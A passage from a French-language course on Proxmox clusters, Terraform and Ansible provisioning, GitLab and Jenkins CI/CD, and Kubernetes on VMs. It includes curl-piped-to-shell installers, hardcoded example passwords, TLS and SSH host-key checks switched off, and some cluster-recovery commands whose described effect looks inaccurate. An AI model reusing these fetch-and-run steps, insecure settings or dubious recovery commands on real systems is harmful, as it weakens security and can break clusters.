ha-manager set vm:101 --state relocate --node proxmox2

# Maintenance nœud (évacuation VMs)
ha-manager set vm:101 --state freeze  # Empêche migration auto
pvecm mtunnel -migration_network 192.168.1.0/24 proxmox2
qm migrate 101 proxmox2 --online
```

### Réseaux cluster avancés

**Configuration multi-ring corosync :**

```bash
# Configuration 2 anneaux redondants
# /etc/pve/corosync.conf
totem {
    interface {
        ringnumber: 0
        bindnetaddr: 192.168.1.0    # Management network
        mcastaddr: 239.192.1.1
        mcastport: 5405
    }
    
    interface {
        ringnumber: 1
        bindnetaddr: 172.16.0.0     # Dedicated corosync
        mcastaddr: 239.192.2.1
        mcastport: 5406
    }
}

# Reload configuration
systemctl reload corosync
```

**Optimisation réseau migration :**

```bash
# Configuration réseau dédié migration
# /etc/pve/datacenter.cfg
migration: secure,network=10.0.1.0/24

# Test bande passante migration
iperf3 -s  # Sur nœud destination
iperf3 -c 10.0.1.11 -t 60 -P 4  # Depuis nœud source

# Optimisation TCP migration
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
sysctl -p
```

### Monitoring et maintenance cluster

**Surveillance proactive :**

```bash
# Script monitoring cluster complet
#!/bin/bash
LOGFILE="/var/log/cluster-health.log"
DATE=$(date '+%Y-%m-%d %H:%M:%S')

# Vérification quorum
QUORUM_STATUS=$(corosync-quorumtool -s | grep "Quorate" | awk '{print $2}')
if [ "$QUORUM_STATUS" != "Yes" ]; then
    echo "$DATE - CRITICAL: Cluster not quorate" >> $LOGFILE
    # Alerte critique
fi

# Vérification nœuds
EXPECTED_NODES=3
ONLINE_NODES=$(pvecm nodes | grep -c "online")
if [ $ONLINE_NODES -lt $EXPECTED_NODES ]; then
    echo "$DATE - WARNING: Only $ONLINE_NODES/$EXPECTED_NODES nodes online" >> $LOGFILE
fi

# Vérification services HA
HA_ERRORS=$(ha-manager status | grep -c "error")
if [ $HA_ERRORS -gt 0 ]; then
    echo "$DATE - ERROR: $HA_ERRORS HA services in error state" >> $LOGFILE
fi

# Vérification stockage partagé
CEPH_HEALTH=$(ceph health | grep -c "HEALTH_OK")
if [ $CEPH_HEALTH -eq 0 ]; then
    echo "$DATE - WARNING: Ceph cluster not healthy" >> $LOGFILE
fi
```

**Maintenance préventive :**

```bash
# Sauvegarde configuration cluster
tar -czf /root/cluster-backup-$(date +%Y%m%d).tar.gz /etc/pve/

# Nettoyage logs anciens
find /var/log/pve/ -name "*.log" -mtime +30 -delete

# Vérification intégrité pmxcfs
pmxcfs -l  # Liste fichiers corrompus
```

### Dépannage cluster

**Problèmes courants et solutions :**

```bash
# Nœud ne rejoint pas le cluster
# 1. Vérifier connectivité réseau
ping 192.168.1.10
telnet 192.168.1.10 5405

# 2. Vérifier certificats
ls -la /etc/pve/nodes/*/pve-ssl.pem

# 3. Reset configuration locale
systemctl stop pve-cluster corosync
rm -rf /etc/corosync/corosync.conf
pvecm add 192.168.1.10

# Split-brain recovery
# 1. Identifier nœud avec données les plus récentes
ls -la /etc/pve/

# 2. Arrêter services sur nœuds secondaires
systemctl stop pve-cluster corosync

# 3. Forcer quorum sur nœud principal
corosync-quorumtool -e

# 4. Réintégrer nœuds un par un
pvecm add <node-ip>
```

### Cas d'usage spécialisés

**Infrastructure de production :** Déployez un cluster 5 nœuds avec quorum device externe pour éliminer les risques de split-brain. Configurez des réseaux dédiés pour corosync, migration et stockage.

**Environnement de développement :** Utilisez un cluster 3 nœuds avec stockage local et réplication périodique. Configurez des groupes HA différenciés selon la criticité des environnements.

**Edge computing :** Implémentez des clusters 2 nœuds + witness pour les sites distants avec connectivité limitée. Optimisez la configuration corosync pour les latences élevées.

---


# Module 6 : Cas d'Usage DevOps

## 6.1 Infrastructure as Code

### Révolution de l'Infrastructure as Code

**Infrastructure as Code (IaC)** transforme la gestion d'infrastructure d'un processus manuel et error-prone vers une approche programmatique, versionnée et reproductible. Cette méthodologie traite l'infrastructure comme du code logiciel : versionnée, testée, et déployée via des pipelines automatisés.

Imaginez IaC comme la **différence entre construire une maison à la main versus utiliser des plans d'architecte et des outils industriels**. Avec IaC, vous définissez une fois votre infrastructure dans du code, puis vous pouvez la reproduire identiquement autant de fois que nécessaire, dans différents environnements, avec la garantie de cohérence.

### Principes fondamentaux IaC

**Déclaratif vs Impératif** : L'approche déclarative décrit l'état désiré final, tandis que l'approche impérative définit les étapes pour y parvenir.

```
Approche Impérative (Scripts) :
1. Créer VM avec 4 vCPU
2. Allouer 8GB RAM
3. Attacher disque 100GB
4. Configurer réseau VLAN 20
5. Installer OS Ubuntu 22.04
6. Configurer SSH
7. Installer Docker
8. Démarrer services

Approche Déclarative (Terraform) :
resource "proxmox_vm_qemu" "web_server" {
  name        = "web-server-01"
  target_node = "proxmox1"
  cores       = 4
  memory      = 8192
  disk {
    size    = "100G"
    storage = "local-lvm"
  }
  network {
    bridge = "vmbr0"
    tag    = 20
  }
  os_type = "ubuntu"
}
```

### Terraform pour Proxmox

**Terraform** excelle dans la gestion d'infrastructure multi-cloud et multi-provider, incluant Proxmox via le provider officiel.

**Installation et configuration :**

```bash
# Installation Terraform
wget https://releases.hashicorp.com/terraform/1.6.0/terraform_1.6.0_linux_amd64.zip
unzip terraform_1.6.0_linux_amd64.zip
sudo mv terraform /usr/local/bin/

# Vérification
terraform version

# Configuration provider Proxmox
# main.tf
terraform {
  required_providers {
    proxmox = {
      source  = "telmate/proxmox"
      version = "2.9.14"
    }
  }
}

provider "proxmox" {
  pm_api_url      = "https://192.168.1.10:8006/api2/json"
  pm_user         = "terraform@pve"
  pm_password     = "secure_password"
  pm_tls_insecure = true
}
```

**Création d'infrastructure complète :**

```hcl
# variables.tf
variable "vm_count" {
  description = "Number of VMs to create"
  type        = number
  default     = 3
}

variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

# templates.tf
resource "proxmox_vm_qemu" "kubernetes_nodes" {
  count       = var.vm_count
  name        = "k8s-node-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  # Template configuration
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  # Hardware configuration
  cores   = 4
  sockets = 1
  memory  = 8192
  
  # Storage configuration
  disk {
    size     = "50G"
    type     = "scsi"
    storage  = "ceph-storage"
    iothread = 1
    discard  = "on"
  }
  
  # Network configuration
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 20
  }
  
  # Cloud-init configuration
  os_type    = "cloud-init"
  ipconfig0  = "ip=192.168.20.${10 + count.index}/24,gw=192.168.20.1"
  nameserver = "8.8.8.8"
  sshkeys    = file("~/.ssh/id_rsa.pub")
  
  # Lifecycle management
  lifecycle {
    ignore_changes = [
      network,
      disk,
    ]
  }
  
  tags = "${var.environment},kubernetes,terraform"
}

# Load balancer
resource "proxmox_vm_qemu" "load_balancer" {
  name        = "lb-${var.environment}"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 2
  memory = 4096
  
  disk {
    size    = "20G"
    type    = "scsi"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 30  # DMZ VLAN
  }
  
  ipconfig0 = "ip=192.168.30.10/24,gw=192.168.30.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.environment},loadbalancer,terraform"
}

# outputs.tf
output "kubernetes_nodes_ips" {
  value = proxmox_vm_qemu.kubernetes_nodes[*].default_ipv4_address
}

output "load_balancer_ip" {
  value = proxmox_vm_qemu.load_balancer.default_ipv4_address
}
```

### Ansible pour la configuration

**Ansible** complète Terraform en gérant la configuration post-déploiement des systèmes.

**Playbook Kubernetes complet :**

```yaml
# inventory/hosts.yml
all:
  children:
    kubernetes:
      children:
        masters:
          hosts:
            k8s-master-1:
              ansible_host: 192.168.20.10
              node_role: master
        workers:
          hosts:
            k8s-node-1:
              ansible_host: 192.168.20.11
              node_role: worker
            k8s-node-2:
              ansible_host: 192.168.20.12
              node_role: worker
    loadbalancers:
      hosts:
        lb-production:
          ansible_host: 192.168.30.10

# playbooks/site.yml
---
- name: Configure Kubernetes Cluster
  hosts: kubernetes
  become: yes
  vars:
    kubernetes_version: "1.28.0"
    pod_network_cidr: "10.244.0.0/16"
    
  tasks:
    - name: Update system packages
      apt:
        update_cache: yes
        upgrade: dist
        
    - name: Install required packages
      apt:
        name:
          - apt-transport-https
          - ca-certificates
          - curl
          - gnupg
          - lsb-release
        state: present
        
    - name: Add Docker GPG key
      apt_key:
        url: https://download.docker.com/linux/ubuntu/gpg
        state: present
        
    - name: Add Docker repository
      apt_repository:
        repo: "deb [arch=amd64] https://download.docker.com/linux/ubuntu {{ ansible_distribution_release }} stable"
        state: present
        
    - name: Install Docker
      apt:
        name: docker-ce
        state: present
        
    - name: Add Kubernetes GPG key
      apt_key:
        url: https://packages.cloud.google.com/apt/doc/apt-key.gpg
        state: present
        
    - name: Add Kubernetes repository
      apt_repository:
        repo: "deb https://apt.kubernetes.io/ kubernetes-xenial main"
        state: present
        
    - name: Install Kubernetes components
      apt:
        name:
          - kubelet={{ kubernetes_version }}-00
          - kubeadm={{ kubernetes_version }}-00
          - kubectl={{ kubernetes_version }}-00
        state: present
        
    - name: Hold Kubernetes packages
      dpkg_selections:
        name: "{{ item }}"
        selection: hold
      loop:
        - kubelet
        - kubeadm
        - kubectl

- name: Initialize Kubernetes Master
  hosts: masters
  become: yes
  tasks:
    - name: Initialize Kubernetes cluster
      command: >
        kubeadm init
        --pod-network-cidr={{ pod_network_cidr }}
        --apiserver-advertise-address={{ ansible_default_ipv4.address }}
      register: kubeadm_init
      when: inventory_hostname == groups['masters'][0]
      
    - name: Create .kube directory
      file:
        path: /home/{{ ansible_user }}/.kube
        state: directory
        owner: "{{ ansible_user }}"
        group: "{{ ansible_user }}"
        
    - name: Copy admin.conf to user's kube config
      copy:
        src: /etc/kubernetes/admin.conf
        dest: /home/{{ ansible_user }}/.kube/config
        owner: "{{ ansible_user }}"
        group: "{{ ansible_user }}"
        remote_src: yes
        
    - name: Install Flannel CNI
      become_user: "{{ ansible_user }}"
      command: kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml
      when: inventory_hostname == groups['masters'][0]

- name: Join Worker Nodes
  hosts: workers
  become: yes
  tasks:
    - name: Get join command
      shell: kubeadm token create --print-join-command
      register: join_command
      delegate_to: "{{ groups['masters'][0] }}"
      
    - name: Join cluster
      command: "{{ join_command.stdout }}"
```

### GitOps et CI/CD

**GitOps** étend IaC en utilisant Git comme source de vérité pour l'infrastructure et les déploiements.

**Pipeline GitLab CI/CD complet :**

```yaml
# .gitlab-ci.yml
stages:
  - validate
  - plan
  - apply
  - configure
  - test

variables:
  TF_ROOT: ${CI_PROJECT_DIR}/terraform
  TF_ADDRESS: ${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/terraform/state/production

before_script:
  - cd ${TF_ROOT}
  - terraform --version
  - terraform init

validate:
  stage: validate
  script:
    - terraform validate
    - terraform fmt -check
  only:
    - merge_requests
    - main

plan:
  stage: plan
  script:
    - terraform plan -out="planfile"
  artifacts:
    paths:
      - ${TF_ROOT}/planfile
    expire_in: 1 week
  only:
    - merge_requests
    - main

apply:
  stage: apply
  script:
    - terraform apply -input=false "planfile"
  dependencies:
    - plan
  only:
    - main
  when: manual

configure:
  stage: configure
  image: ansible/ansible:latest
  script:
    - ansible-galaxy install -r requirements.yml
    - ansible-playbook -i inventory/hosts.yml playbooks/site.yml
  dependencies:
    - apply
  only:
    - main

test:
  stage: test
  script:
    - |
      # Test infrastructure
      ansible all -i inventory/hosts.yml -m ping
      
      # Test Kubernetes cluster
      kubectl get nodes
      kubectl get pods --all-namespaces
      
      # Test application deployment
      kubectl apply -f k8s/test-deployment.yml
      kubectl wait --for=condition=available --timeout=300s deployment/test-app
  only:
    - main
```

### Gestion des secrets et configuration

**Vault integration** pour la gestion sécurisée des secrets :

```hcl
# vault.tf
data "vault_generic_secret" "proxmox_credentials" {
  path = "secret/proxmox"
}

provider "proxmox" {
  pm_api_url  = "https://192.168.1.10:8006/api2/json"
  pm_user     = data.vault_generic_secret.proxmox_credentials.data["username"]
  pm_password = data.vault_generic_secret.proxmox_credentials.data["password"]
}
```

**Ansible Vault** pour les données sensibles :

```bash
# Création vault
ansible-vault create group_vars/all/vault.yml

# Contenu chiffré
vault_db_password: "super_secret_password"
vault_api_key: "secret_api_key"

# Utilisation dans playbooks
- name: Configure database
  mysql_user:
    name: app_user
    password: "{{ vault_db_password }}"
    state: present
```

### Monitoring et observabilité IaC

**Prometheus + Grafana via Terraform :**

```hcl
# monitoring.tf
resource "proxmox_vm_qemu" "monitoring" {
  name        = "monitoring-stack"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 4
  memory = 8192
  
  disk {
    size    = "100G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 10  # Management VLAN
  }
  
  ipconfig0 = "ip=192.168.10.20/24,gw=192.168.10.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "monitoring,prometheus,grafana"
}

# Provisioning avec cloud-init
resource "proxmox_cloud_init_disk" "monitoring_ci" {
  name     = "monitoring-ci"
  pve_node = "proxmox1"
  storage  = "local-lvm"
  
  user_data = templatefile("${path.module}/cloud-init/monitoring.yml", {
    hostname = "monitoring-stack"
  })
}
```

---

## 6.2 CI/CD avec virtualisation

### Pipelines CI/CD modernes

Les **pipelines CI/CD (Continuous Integration/Continuous Deployment)** dans un environnement virtualisé offrent une flexibilité et une scalabilité exceptionnelles. La virtualisation permet de créer des environnements de build isolés, reproductibles, et optimisés pour chaque type de charge de travail.

Imaginez un pipeline CI/CD comme une **chaîne de production automobile moderne** : chaque étape (build, test, déploiement) dispose de stations spécialisées (VMs dédiées) qui peuvent être adaptées, répliquées ou remplacées selon les besoins, sans impacter les autres étapes de la chaîne.

### Architecture CI/CD distribuée

```
Architecture CI/CD sur Proxmox :

                    GitLab/Jenkins Master
                    ┌─────────────────────┐
                    │ Control Plane       │
                    │ ┌─────────────────┐ │
                    │ │ Pipeline Engine │ │
                    │ │ Job Scheduler   │ │
                    │ │ Artifact Store  │ │
                    │ └─────────────────┘ │
                    └─────────────────────┘
                              │
                    ┌─────────┼─────────┐
                    │         │         │
            ┌───────▼──┐ ┌────▼────┐ ┌──▼──────┐
            │Build Pool│ │Test Pool│ │Deploy   │
            │          │ │         │ │Pool     │
            │┌────────┐│ │┌───────┐│ │┌───────┐│
            ││VM Build││ ││VM Test││ ││VM Prod││
            ││ Node 1 ││ ││ Env 1 ││ ││ Env 1 ││
            │└────────┘│ │└───────┘│ │└───────┘│
            │┌────────┐│ │┌───────┐│ │┌───────┐│
            ││VM Build││ ││VM Test││ ││VM Prod││
            ││ Node 2 ││ ││ Env 2 ││ ││ Env 2 ││
            │└────────┘│ │└───────┘│ │└───────┘│
            └──────────┘ └─────────┘ └─────────┘

Avantages virtualisation CI/CD :
✓ Isolation complète des builds
✓ Environnements reproductibles
✓ Scalabilité élastique
✓ Optimisation par type de charge
✓ Récupération rapide après échec
✓ Tests multi-OS simultanés
```

### GitLab Runner sur Proxmox

**Configuration GitLab Runner avec exécuteurs VM :**

```bash
# Installation GitLab Runner
curl -L "https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh" | sudo bash
sudo apt-get install gitlab-runner

# Enregistrement runner avec exécuteur shell
sudo gitlab-runner register \
  --url "https://gitlab.company.com/" \
  --registration-token "YOUR_TOKEN" \
  --executor "shell" \
  --description "proxmox-shell-runner" \
  --tag-list "proxmox,shell,build"

# Configuration avancée
# /etc/gitlab-runner/config.toml
concurrent = 4
check_interval = 0

[session_server]
  session_timeout = 1800

[[runners]]
  name = "proxmox-vm-runner"
  url = "https://gitlab.company.com/"
  token = "YOUR_TOKEN"
  executor = "shell"
  
  [runners.custom_build_dir]
    enabled = true
  
  [runners.cache]
    Type = "local"
    Path = "/opt/gitlab-runner/cache"
    Shared = true
  
  [runners.shell]
    shell = "bash"
```

**Pipeline avec création VM dynamique :**

```yaml
# .gitlab-ci.yml
stages:
  - prepare
  - build
  - test
  - deploy
  - cleanup

variables:
  VM_TEMPLATE: "ubuntu-22.04-ci-template"
  VM_NODE: "proxmox1"
  VM_STORAGE: "local-lvm"

create_build_vm:
  stage: prepare
  script:
    - |
      # Création VM temporaire pour le build
      VM_ID=$(pvesh get /cluster/nextid)
      qm clone 9000 $VM_ID --name "ci-build-${CI_PIPELINE_ID}" --target $VM_NODE
      qm set $VM_ID --memory 4096 --cores 4
      qm set $VM_ID --net0 virtio,bridge=vmbr0,tag=20
      qm start $VM_ID
      
      # Attendre démarrage
      sleep 60
      
      # Récupérer IP
      VM_IP=$(qm guest cmd $VM_ID network-get-interfaces | jq -r '.[] | select(.name=="eth0") | .["ip-addresses"][] | select(.["ip-address-type"]=="ipv4") | .["ip-address"]')
      
      echo "VM_ID=$VM_ID" > vm_info.env
      echo "VM_IP=$VM_IP" >> vm_info.env
  artifacts:
    reports:
      dotenv: vm_info.env
    expire_in: 1 hour

build_application:
  stage: build
  dependencies:
    - create_build_vm
  script:
    - |
      # Connexion à la VM de build
      ssh -o StrictHostKeyChecking=no ci-user@$VM_IP << 'EOF'
        # Installation dépendances
        sudo apt update
        sudo apt install -y nodejs npm docker.io
        
        # Clone du code
        git clone $CI_REPOSITORY_URL app
        cd app
        git checkout $CI_COMMIT_SHA
        
        # Build application
        npm install
        npm run build
        
        # Build image Docker
        docker build -t app:$CI_COMMIT_SHA .
        docker save app:$CI_COMMIT_SHA > app-image.tar
      EOF
      
      # Récupération artefacts
      scp ci-user@$VM_IP:~/app/app-image.tar .
      scp ci-user@$VM_IP:~/app/dist ./dist
  artifacts:
    paths:
      - app-image.tar
      - dist/
    expire_in: 1 day

test_application:
  stage: test
  dependencies:
    - create_build_vm
    - build_application
  script:
    - |
      # Tests unitaires
      ssh ci-user@$VM_IP << 'EOF'
        cd app
        npm test
        npm run test:coverage
      EOF
      
      # Tests d'intégration avec Docker
      docker load < app-image.tar
      docker run -d --name test-app -p 3000:3000 app:$CI_COMMIT_SHA
      
      # Tests fonctionnels
      sleep 10
      curl -f http://localhost:3000/health || exit 1
      
      # Nettoyage
      docker stop test-app
      docker rm test-app

cleanup_vm:
  stage: cleanup
  dependencies:
    - create_build_vm
  script:
    - |
      # Suppression VM temporaire
      qm stop $VM_ID
      qm destroy $VM_ID --purge
  when: always
```

### Jenkins avec Proxmox Cloud Plugin

**Configuration Jenkins pour Proxmox :**

```groovy
// Jenkinsfile
pipeline {
    agent none
    
    environment {
        PROXMOX_URL = 'https://192.168.1.10:8006'
        PROXMOX_NODE = 'proxmox1'
        VM_TEMPLATE = '9000'
    }
    
    stages {
        stage('Provision Build Environment') {
            steps {
                script {
                    // Création VM via API Proxmox
                    def vmId = sh(
                        script: "pvesh get /cluster/nextid",
                        returnStdout: true
                    ).trim()
                    
                    sh """
                        qm clone ${VM_TEMPLATE} ${vmId} --name "jenkins-build-${BUILD_NUMBER}"
                        qm set ${vmId} --memory 8192 --cores 4
                        qm set ${vmId} --net0 virtio,bridge=vmbr0,tag=20
                        qm start ${vmId}
                    """
                    
                    env.BUILD_VM_ID = vmId
                    
                    // Attendre disponibilité SSH
                    timeout(time: 5, unit: 'MINUTES') {
                        waitUntil {
                            script {
                                def result = sh(
                                    script: "qm guest ping ${vmId}",
                                    returnStatus: true
                                )
                                return result == 0
                            }
                        }
                    }
                }
            }
        }
        
        stage('Build') {
            agent {
                label "vm-${env.BUILD_VM_ID}"
            }
            steps {
                checkout scm
                
                sh '''
                    # Installation dépendances
                    sudo apt update
                    sudo apt install -y nodejs npm
                    
                    # Build application
                    npm install
                    npm run build
                    npm test
                '''
                
                archiveArtifacts artifacts: 'dist/**', fingerprint: true
            }
        }
        
        stage('Docker Build') {
            agent {
                label "vm-${env.BUILD_VM_ID}"
            }
            steps {
                script {
                    def image = docker.build("myapp:${env.BUILD_NUMBER}")
                    docker.withRegistry('https://registry.company.com', 'registry-credentials') {
                        image.push()
                        image.push("latest")
                    }
                }
            }
        }
        
        stage('Integration Tests') {
            parallel {
                stage('Unit Tests') {
                    agent {
                        label "vm-${env.BUILD_VM_ID}"
                    }
                    steps {
                        sh 'npm run test:unit'
                        publishTestResults testResultsPattern: 'test-results.xml'
                    }
                }
                
                stage('Security Scan') {
                    agent {
                        label "security-scanner"
                    }
                    steps {
                        sh '''
                            # Scan de sécurité avec Trivy
                            trivy image myapp:${BUILD_NUMBER}
                            
                            # Scan SAST avec SonarQube
                            sonar-scanner -Dsonar.projectKey=myapp
                        '''
                    }
                }
            }
        }
        
        stage('Deploy to Staging') {
            agent {
                label "deployment"
            }
            steps {
                script {
                    // Déploiement sur environnement de staging
                    sh '''
                        # Mise à jour Kubernetes
                        kubectl set image deployment/myapp-staging myapp=registry.company.com/myapp:${BUILD_NUMBER}
                        kubectl rollout status deployment/myapp-staging
                        
                        # Tests de fumée
                        sleep 30
                        curl -f http://staging.company.com/health
                    '''
                }
            }
        }
        
        stage('Deploy to Production') {
            when {
                branch 'main'
            }
            agent {
                label "deployment"
            }
            steps {
                input message: 'Deploy to production?', ok: 'Deploy'
                
                script {
                    sh '''
                        # Déploiement blue-green
                        kubectl apply -f k8s/production/
                        kubectl set image deployment/myapp-prod myapp=registry.company.com/myapp:${BUILD_NUMBER}
                        kubectl rollout status deployment/myapp-prod
                        
                        # Vérification santé
                        kubectl get pods -l app=myapp
                        curl -f http://prod.company.com/health
                    '''
                }
            }
        }
    }
    
    post {
        always {
            script {
                // Nettoyage VM de build
                if (env.BUILD_VM_ID) {
                    sh """
                        qm stop ${env.BUILD_VM_ID} || true
                        qm destroy ${env.BUILD_VM_ID} --purge || true
                    """
                }
            }
        }
        
        success {
            slackSend(
                color: 'good',
                message: "✅ Build ${env.BUILD_NUMBER} succeeded for ${env.JOB_NAME}"
            )
        }
        
        failure {
            slackSend(
                color: 'danger',
                message: "❌ Build ${env.BUILD_NUMBER} failed for ${env.JOB_NAME}"
            )
        }
    }
}
```

### Optimisation des performances CI/CD

**Cache distribué et artefacts :**

```bash
# Configuration cache Redis pour builds
# /etc/gitlab-runner/config.toml
[[runners]]
  [runners.cache]
    Type = "redis"
    Host = "192.168.1.50:6379"
    Password = "cache_password"
    
  [runners.cache.redis]
    MaxItemSize = 1073741824  # 1GB
```

**Templates optimisés pour CI/CD :**

```bash
# Création template CI/CD optimisé
# Base Ubuntu avec outils pré-installés
qm create 9001 --name "ubuntu-ci-template" --memory 2048 --cores 2 --net0 virtio,bridge=vmbr0

# Installation outils communs
virt-customize -a /var/lib/vz/images/9001/vm-9001-disk-0.qcow2 \
  --install git,curl,wget,build-essential,nodejs,npm,docker.io,python3,pip \
  --run-command "npm install -g yarn" \
  --run-command "pip3 install ansible" \
  --run-command "curl -fsSL https://get.docker.com | sh" \
  --run-command "usermod -aG docker ci-user"

# Conversion en template
qm template 9001
```

### Monitoring et métriques CI/CD

**Surveillance des pipelines :**

```python
# monitoring/pipeline_metrics.py
import requests
import time
from prometheus_client import start_http_server, Gauge, Counter

# Métriques Prometheus
pipeline_duration = Gauge('gitlab_pipeline_duration_seconds', 'Pipeline duration', ['project', 'branch'])
pipeline_success = Counter('gitlab_pipeline_success_total', 'Successful pipelines', ['project'])
pipeline_failure = Counter('gitlab_pipeline_failure_total', 'Failed pipelines', ['project'])
vm_creation_time = Gauge('proxmox_vm_creation_seconds', 'VM creation time')

def collect_gitlab_metrics():
    """Collecte métriques GitLab CI/CD"""
    gitlab_url = "https://gitlab.company.com"
    headers = {"PRIVATE-TOKEN": "your-token"}
    
    projects = requests.get(f"{gitlab_url}/api/v4/projects", headers=headers).json()
    
    for project in projects:
        project_id = project['id']
        project_name = project['name']
        
        # Récupération pipelines récents
        pipelines = requests.get(
            f"{gitlab_url}/api/v4/projects/{project_id}/pipelines",
            headers=headers,
            params={"per_page": 10}
        ).json()
        
        for pipeline in pipelines:
            if pipeline['status'] == 'success':
                pipeline_success.labels(project=project_name).inc()
            elif pipeline['status'] == 'failed':
                pipeline_failure.labels(project=project_name).inc()
                
            # Durée pipeline
            if pipeline['duration']:
                pipeline_duration.labels(
                    project=project_name,
                    branch=pipeline['ref']
                ).set(pipeline['duration'])

if __name__ == '__main__':
    start_http_server(8000)
    while True:
        collect_gitlab_metrics()
        time.sleep(60)
```

### Cas d'usage spécialisés

**Microservices CI/CD :** Créez des pipelines parallèles avec des VMs spécialisées par service. Utilisez des templates optimisés pour chaque stack technologique (Node.js, Python, Go, etc.).

**Tests de charge automatisés :** Provisionnez dynamiquement des clusters de VMs pour les tests de performance. Configurez des environnements éphémères qui se détruisent automatiquement après les tests.

**Déploiements multi-environnements :** Implémentez des pipelines de promotion automatique entre environnements (dev → staging → prod) avec validation automatique et rollback en cas d'échec.

---

## 6.3 Kubernetes et conteneurs

### Kubernetes sur infrastructure virtualisée

**Kubernetes** sur infrastructure virtualisée combine les avantages de l'orchestration de conteneurs avec la flexibilité et l'isolation des machines virtuelles. Cette approche hybride permet de bénéficier de la portabilité des conteneurs tout en conservant les garanties de sécurité et d'isolation des VMs.

Imaginez cette architecture comme un **centre commercial moderne** : Kubernetes est le gestionnaire qui organise les boutiques (conteneurs) dans différents étages (nœuds), tandis que la virtualisation fournit les bâtiments sécurisés et isolés (VMs) qui hébergent ces étages. Cette séparation permet une gestion fine des ressources et une sécurité renforcée.

### Architecture Kubernetes sur Proxmox

```
Kubernetes Cluster sur Proxmox :

                    Proxmox Cluster
┌─────────────────────────────────────────────────────┐
│                                                     │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐ │
│  │ Node 1      │  │ Node 2      │  │ Node 3      │ │
│  │ proxmox1    │  │ proxmox2    │  │ proxmox3    │ │
│  └─────────────┘  └─────────────┘  └─────────────┘ │
└─────────────────────────────────────────────────────┘
           │                │                │
    ┌──────▼──────┐  ┌──────▼──────┐  ┌──────▼──────┐
    │ VM Master 1 │  │ VM Master 2 │  │ VM Master 3 │
    │ k8s-master-1│  │ k8s-master-2│  │ k8s-master-3│
    │ 4 vCPU      │  │ 4 vCPU      │  │ 4 vCPU      │
    │ 8 GB RAM    │  │ 8 GB RAM    │  │ 8 GB RAM    │
    └─────────────┘  └─────────────┘  └─────────────┘
           │                │                │
    ┌──────▼──────┐  ┌──────▼──────┐  ┌──────▼──────┐
    │ VM Worker 1 │  │ VM Worker 2 │  │ VM Worker 3 │
    │ k8s-worker-1│  │ k8s-worker-2│  │ k8s-worker-3│
    │ 8 vCPU      │  │ 8 vCPU      │  │ 8 vCPU      │
    │ 16 GB RAM   │  │ 16 GB RAM   │  │ 16 GB RAM   │
    └─────────────┘  └─────────────┘  └─────────────┘
           │                │                │
    ┌──────▼──────┐  ┌──────▼──────┐  ┌──────▼──────┐
    │ VM Worker 4 │  │ VM Worker 5 │  │ VM Worker 6 │
    │ k8s-worker-4│  │ k8s-worker-5│  │ k8s-worker-6│
    │ 8 vCPU      │  │ 8 vCPU      │  │ 8 vCPU      │
    │ 16 GB RAM   │  │ 16 GB RAM   │  │ 16 GB RAM   │
    └─────────────┘  └─────────────┘  └─────────────┘

Avantages architecture hybride :
✓ Isolation renforcée (VM + namespace)
✓ Sécurité multi-tenant
✓ Flexibilité dimensionnement
✓ Migration à chaud possible
✓ Récupération granulaire
✓ Compatibilité legacy
```

### Déploiement automatisé avec Terraform

**Infrastructure Kubernetes complète :**

```hcl
# kubernetes-cluster.tf
variable "cluster_name" {
  description = "Kubernetes cluster name"
  type        = string
  default     = "production"
}

variable "master_count" {
  description = "Number of master nodes"
  type        = number
  default     = 3
}

variable "worker_count" {
  description = "Number of worker nodes"
  type        = number
  default     = 6
}

# Master nodes
resource "proxmox_vm_qemu" "k8s_masters" {
  count       = var.master_count
  name        = "k8s-master-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-22.04-k8s-template"
  full_clone = true
  
  # Optimized for control plane
  cores   = 4
  sockets = 1
  memory  = 8192
  
  # Fast storage for etcd
  disk {
    size     = "50G"
    type     = "scsi"
    storage  = "local-ssd"
    iothread = 1
    discard  = "on"
  }
  
  # Dedicated management network
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 10
  }
  
  # Cloud-init configuration
  os_type    = "cloud-init"
  ipconfig0  = "ip=192.168.10.${10 + count.index}/24,gw=192.168.10.1"
  nameserver = "8.8.8.8"
  sshkeys    = file("~/.ssh/id_rsa.pub")
  
  # Kubernetes-specific settings
  agent    = 1
  qemu_os  = "l26"
  cpu      = "host"
  numa     = true
  
  tags = "${var.cluster_name},kubernetes,master,terraform"
  
  lifecycle {
    ignore_changes = [
      network,
      disk,
    ]
  }
}

# Worker nodes
resource "proxmox_vm_qemu" "k8s_workers" {
  count       = var.worker_count
  name        = "k8s-worker-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-22.04-k8s-template"
  full_clone = true
  
  # Optimized for workloads
  cores   = 8
  sockets = 1
  memory  = 16384
  
  # Storage for containers and logs
  disk {
    size     = "100G"
    type     = "scsi"
    storage  = "ceph-storage"
    iothread = 1
    discard  = "on"
  }
  
  # Additional disk for container storage
  disk {
    size     = "200G"
    type     = "scsi"
    storage  = "ceph-storage"
    iothread = 1
    discard  = "on"
  }
  
  # Pod network
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 20
  }
  
  os_type    = "cloud-init"
  ipconfig0  = "ip=192.168.20.${10 + count.index}/24,gw=192.168.20.1"
  nameserver = "8.8.8.8"
  sshkeys    = file("~/.ssh/id_rsa.pub")
  
  agent    = 1
